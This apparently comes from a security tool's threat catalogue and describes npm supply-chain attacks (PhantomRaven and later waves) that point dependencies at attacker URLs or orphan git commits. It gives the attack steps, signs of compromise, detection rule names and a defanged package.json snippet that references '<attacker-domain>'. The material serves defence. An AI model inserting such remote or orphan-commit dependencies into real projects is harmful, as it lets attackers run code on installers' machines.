# Remote dynamic dependencies (PhantomRaven, orphan-commit dependencies)

**Type:** Package & maintainer takeover · **When:** 2025 to 2026 · **Status:** confirmed

## What happened
Instead of putting the bad code in the package, the attacker points a dependency at an outside address. The code is fetched at install time.
- **PhantomRaven:** npm packages used dependencies fetched from a remote address at install. Registry scanners only saw a harmless stub. Earlier versions of the campaign did not use this trick; it was added later.
- **@antv wave (May 2026):** an optional dependency pointed at an orphan commit in antvis/G2 (an "orphan commit" is a commit not on any branch).
- **ChainDrop (Aug 2026):** an optional dependency pointed at an `opensearch-js` GitHub commit.

## How it got in
1. The package lists a dependency as a URL or a git commit, not a version.
2. The target is a server or an orphan commit the attacker controls.
3. On install, the package manager downloads and runs whatever is there.

## Why it was hard to spot
- The published package looks clean.
- The real payload can change any time on the remote side.
- An orphan commit is not visible on any branch.

## Signs to look for
- In one change: a dependency that is a URL, a git URL or a commit hash; an "optional" dependency nobody asked for.
- Across changes over time: a package that switches from versions to URLs in a later release.

## Defanged example
```
package.json:
  "optionalDependencies": {
+   "<helper>": "github:<owner>/<repo>#<orphan-commit-sha>"
+   "<other>":  "https://<attacker-domain>/<file>.tgz"
  }
```

## How Pushguard catches it
- **Diff rules:** `js-dependency-from-url`, `py-requirements-from-url`, `rust-dependency-from-source`, `ruby-gem-from-source`.
- **Detonation:** runs install with no network, so the fetch fails. That failure is evidence, but no payload is seen.
- If the URL dependency is inside a package you depend on, not in your repo, nothing catches it yet.

## References
- [Sonatype on PhantomRaven](https://www.sonatype.com/blog/phantomraven-npm-malware)
- [CSA note on PhantomRaven](https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/03/CSA_research_note_phantomraven_npm_dev_credential_theft_20260312-csa-styled.pdf)
- [Unit 42 (fetched)](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)
- [Datadog (fetched)](https://securitylabs.datadoghq.com/articles/npm-worm-compromises-popular-npm-packages/)
